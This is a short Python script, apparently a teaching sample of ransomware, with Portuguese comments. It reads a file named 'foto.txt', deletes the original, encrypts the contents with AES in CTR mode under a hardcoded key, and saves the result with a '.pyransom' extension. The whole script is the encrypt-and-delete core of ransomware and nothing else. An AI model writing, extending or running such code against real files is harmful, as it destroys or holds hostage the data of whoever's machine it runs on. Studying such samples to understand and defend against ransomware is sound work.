import os
import pyaes
#abrindo o arquivo
file_name = "foto.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()
#removendo o arquivo
os.remove(file_name)
#chave criptográfica
key = b"0143256879fravtr"
aes= pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
new_file_name = file_name + ".pyransom"
new_file = open(new_file_name, "wb")
new_file.write(crypto_data)
new_file.close()